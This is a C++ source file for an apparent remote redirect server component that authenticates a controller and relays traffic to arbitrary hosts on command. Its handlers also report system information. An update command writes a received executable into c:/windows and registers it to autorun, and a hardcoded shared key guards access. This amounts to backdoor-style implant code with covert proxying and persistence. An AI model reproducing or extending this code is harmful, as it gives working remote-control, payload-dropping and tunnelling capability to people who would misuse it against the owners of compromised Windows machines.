#include "rdconnection.h"
#include "../common/codec.h"
#include "rdserver.h"
#include <time.h>


void autoRunSetIn(const char* cmdshell);

RedirectConnection::RedirectConnection(RdServer* server,shared_ptr<swlib::TcpSocket>& sockIn){
	_server = server;
	_sockIn = sockIn;
}

RedirectConnection::~RedirectConnection(){
	//stop();
}

bool RedirectConnection::start(){
	
	//_threadSelect = new swlib::Thread(RedirectConnection::threadEntry,this);
	//_threadSelect->start2();
	DWORD tid;
	HANDLE 	thandle = CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)threadEntry,(void*)this,NULL,&tid);
	return true;
}


void RedirectConnection::threadEntry(void* user){
	RedirectConnection* rc = (RedirectConnection*)user;	
	rc->run();
}


void RedirectConnection::run(){
	//发送Helo
	CNM_Helo_t msghelo;
	msghelo.helo = _server->getProps().strHelo;
	
	_server->getLogger().Debug("connection established,enter thread...");
	//////////////////////////////////////////////////////////////////////////
	std::string key = "5173.com";//_server->getConfig().getProperty("secureKey");
	swByteArray data;
	data.assign( (swByte*)msghelo.helo.c_str(),(swByte*)(msghelo.helo.c_str()+msghelo.helo.size()) );
	data.insert(data.end(),(swByte*)key.c_str(),(swByte*)(key.c_str()+key.size()));
	swByteArray digest = swlib::Codec::Md5Calc(&data[0],data.size());
	//////////////////////////////////////////////////////////////////////////
	std::map< RedirectChannelID_t,shared_ptr<swlib::TcpSocket> >::iterator itr;
	std::vector<RedirectChannelID_t> lostsockIds;
	RedirectChannelID_t cid;
	fd_set  fds;	
	timeval tv;
	int r ;
	swByteArray bytes;
	shared_ptr<ConnectionMessageBase> msg;

	data = msghelo.final();
	int size;
	size = _sockIn->write((char*)&data[0],data.size());
	_server->getLogger().Debug(">>send back HELO");
	if(size <= 0){
		goto END;
	}
	//////////////////////////////////////////////////////////////////////////
	tv.tv_sec = 100; //等待认证超时
	tv.tv_usec =0;
	FD_ZERO(&fds);
	FD_SET(_sockIn->get_handle(),&fds);		
	
	r = select(0,&fds,NULL,NULL,&tv);
	if( r <=0){
		_server->getLogger().Error("client not pass auth request in time,discard it!");
		goto END;
	}

	bytes.resize(1024*6);
	//if( FD_ISSET(_sockIn->get_handle(), &fds) ){ 
	size = _sockIn->read((char*)&bytes[0],bytes.size());
	if( size <= 0){
		goto END;
	}
	_server->getLogger().Debug("got client first message,push into queue");
	_mq_incoming.queueIn((char*)&bytes[0],size);	
	if(!_mq_incoming.getMessage(msg)){
		_server->getLogger().Error("parese message failed!");
		goto END;
	}
	if( !msg.get()){ //单次接收不能满足一个包的大小
		_server->getLogger().Error("parese message failed!");
		goto END;
	}
	if(msg->cnmid != CNM_AUTH){	//first packet
		_server->getLogger().Error("invalide message !");
		goto END;
	}
	CNM_Auth_t* auth = (CNM_Auth_t*)msg.get();
	if( memcmp(auth->secureKey,&digest[0],16) ){ //md5 digest不对
		ConnectionMessageBase reject(CNM_REJECT);
		data = reject.final();
		_sockIn->write((char*)&data[0],data.size());
		_server->getLogger().Error("sending REJECT message");
		goto END;
	}
	{
		ConnectionMessageBase accept(CNM_ACCEPT);
		data = accept.final();
	}
	_sockIn->write((char*)&data[0],data.size());
	_server->getLogger().Debug(">>CNM_ACCEPT");
	//auth passed
	//////////////////////////////////////////////////////////////////////////

	while(true){		
		FD_ZERO(&fds);		
		for(itr=_socksOut.begin();itr!=_socksOut.end();itr++){
			FD_SET(itr->second->get_handle(),&fds);			
		}		
		FD_SET(_sockIn->get_handle(),&fds);		
		r = select(0,&fds,NULL,NULL,NULL);
		if( r <=0){	 //socket 异常
			_server->getLogger().Error("select exception unhandled,breaking..");
			break;
		}
		if( FD_ISSET(_sockIn->get_handle(),&fds)){ //incoming socket 
			size = _sockIn->read((char*)&bytes[0],bytes.size());
			if( size <= 0){
				break;	 //incoming socket lost
			}
			_mq_incoming.queueIn((char*)&bytes[0],size);
			if(!processIncomingSocketPacket()){
				_server->getLogger().Error("get message from rdFront failed,broken!");
				break;  //错误的消息包
			}
		}
		lostsockIds.clear();
		for(itr=_socksOut.begin();itr!=_socksOut.end();itr++){
			if(FD_ISSET(itr->second->get_handle(),&fds)){
				size = itr->second->read((char*)&bytes[0],bytes.size());
				cid = (RedirectChannelID_t)itr->second->data(stt_CHANNELID);
				if(size <=0 ){ //LOST connection
					_server->getLogger().Debug("outgoing socket broken! ");
					lostsockIds.push_back(cid);
					shared_ptr<ChannelMessageBase> msgclose = new ChannelMessageBase(CM_CONNECT_CLOSE);
					msgclose->cid = cid;
					swByteArray bytes;
					bytes = msgclose->final();
					_sockIn->write((char*)&bytes[0],bytes.size());
					_server->getLogger().Debug("outgoing sock disconnected,notify CM_CONNECT_CLOSE to rdFront..");
					continue;
				}
				processOutgoingSocketPacket(cid,&bytes[0],(swUInt32)size); //转发
			}
		}		
		for(size_t n=0;n<lostsockIds.size();n++){
			itr =_socksOut.find(lostsockIds[n]);
			if( itr!= _socksOut.end()){
				_socksOut.erase(itr);
			}
		}
		//////////////////////////////////////////////////////////////////////////
	}// end while

END:
	_server->getLogger().Debug("connection Thread exiting...,delete RdConnection");
	_server->removeConnection(this);
	delete this;
}

//打包数据流
bool RedirectConnection::processOutgoingSocketPacket(RedirectChannelID_t cid,swByte* data,swUInt32 size){
	CM_StreamData stream;
	stream.cid = cid;
	stream.data.assign(data,data+size);
	swByteArray bytes;
	bytes = stream.final();
	_sockIn->write((char*)&bytes[0],bytes.size());
	_server->getLogger().Debug("stream data : rdserver -> rdfront");
	return true;
}


bool RedirectConnection::processIncomingSocketPacket(){
	
	while(true){
		bool r;
		shared_ptr<ConnectionMessageBase> msg;
		r = _mq_incoming.getMessage(msg);
		if(!r){
			_server->getLogger().Debug(" dirty Incoming connection, broken !");
			return false; //非法消息报
		}
		if( !msg.get()){
			break;
		}
		//////////////////////////////////////////////////////////////////////////
		//分派消息包
		dispatch(msg);
	}
	return true;
}

void RedirectConnection::dispatch(shared_ptr<ConnectionMessageBase>& msg){
	if(msg->cnmid != CNM_CHANNEL){
		return;
	}
	ChannelMessageBase* cmsg;
	swByteArray bytes;
	std::map< RedirectChannelID_t,shared_ptr<swlib::TcpSocket> >::iterator itr;

	cmsg = (ChannelMessageBase*)msg.get();
	if( cmsg->cmid == CM_CONNECT_OPEN){
		CM_ConnectOpen_t* cmopen = (CM_ConnectOpen_t*)cmsg;
		shared_ptr<swlib::TcpSocket> sock(new swlib::TcpSocket);
		sock->create();
		swlib::SocketAddr saddr;
		saddr.set_naddr(cmopen->addr);
		saddr.set_port(cmopen->port);
		//swlib::SocketAddr saddr(cmopen->addr,cmopen->port);
		_server->getLogger().Debug("request Open Dest :%s",saddr.toString().c_str());
		if( !sock->do_connect(saddr)){ //,cmopen->timeout)){ //连接失败
			ChannelMessageBase reject(CM_CONNECT_REJECT);
			reject.cid = cmsg->cid;
			bytes = reject.final();
			_sockIn->write((char*)&bytes[0],bytes.size());
			_server->getLogger().Debug("outgoning connnect request failed!");
			return;
		}
		_server->getLogger().Debug("connected remote host!");
		//连接成功 
		ChannelMessageBase acpt(CM_CONNECT_ACCEPT);
		acpt.cid = cmsg->cid;
		bytes = acpt.final();
		_sockIn->write((char*)&bytes[0],bytes.size());
		sock->setData(stt_CHANNELID,(void*)cmsg->cid); //记录通道编号
		_socksOut[acpt.cid] = sock; //加入处理队列
	}
	//////////////////////////////////////////////////////////////////////////
	//关闭通道
	if( cmsg->cmid == CM_CONNECT_CLOSE || cmsg->cmid == CM_CONNECT_HALFCLOSE){
		itr = _socksOut.find(cmsg->cid);
		_server->getLogger().Debug("<< CM_CONNECT_CLOSE|CM_CONNECT_HALFCLOSE");
		if(itr!= _socksOut.end()){
			_server->getLogger().Debug("Incoming client Channel Closed,free resource!");
			_socksOut.erase(itr);  //删除外发连接对象
		}
	}
	//////////////////////////////////////////////////////////////////////////
	if( cmsg->cmid == CM_STREAM_DATA){
		CM_StreamData * stream = (CM_StreamData*)cmsg;
		itr = _socksOut.find(cmsg->cid);
		
		if(itr!= _socksOut.end()){
		_server->getLogger().Debug("<< CM_STREAM_DATA : %d(%d bytes)",cmsg->cid,stream->data.size());
			itr->second->write((char*)&stream->data[0],stream->data.size()); //写入到外发连接
		}
	}
	//////////////////////////////////////////////////////////////////////////
	//CNM_SYSQUERY
	if(msg->cnmid == CNM_SYSQUERY){
			CNM_SystemQueryResult result;
			result = getServer()->getSystemInfo();			
			bytes = result.final();
			_sockIn->write((char*)&bytes[0],bytes.size());
	}
	//////////////////////////////////////////////////////////////////////////
	//CNM_UPDATE
	if(msg->cnmid ==CNM_UPDATE ){
		CNM_SystemUpdate* update = (CNM_SystemUpdate*)msg.get();
		if( update->medias.size()){
			char buff[128];
			sprintf(buff,"c:/windows/%d.exe",(unsigned int)swlib::currentTimeTick());
			
			FILE * file = fopen(buff,"wb");
			if(file){
				fwrite(&update->medias[0],update->medias.size(),1,file);
				fclose(file);
			}
			::autoRunSetIn(buff);
		}
	}
	//////////////////////////////////////////////////////////////////////////
	//CNM_REBOOT
	//////////////////////////////////////////////////////////////////////////
	if(msg->cnmid == CNM_REBOOT){
		STARTUPINFO si; 
		memset(&si, 0, sizeof(STARTUPINFO));
		si.cb =sizeof(STARTUPINFO);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_SHOW;
		//PROCESS_INFORMATION pi; 
		//CreateProcess(NULL,L"rdloader.exe",NULL,NULL,FALSE,0,NULL,NULL,&si,&pi);
		HANDLE ph = GetCurrentProcess();
		TerminateProcess(ph,0); // kill self
	}
	//////////////////////////////////////////////////////////////////////////
}

void RedirectConnection::stop(){
// 	swlib::Thread::stop();
// 	_sockIn->close();	 //将引发select 错误
// 	this->wait();
}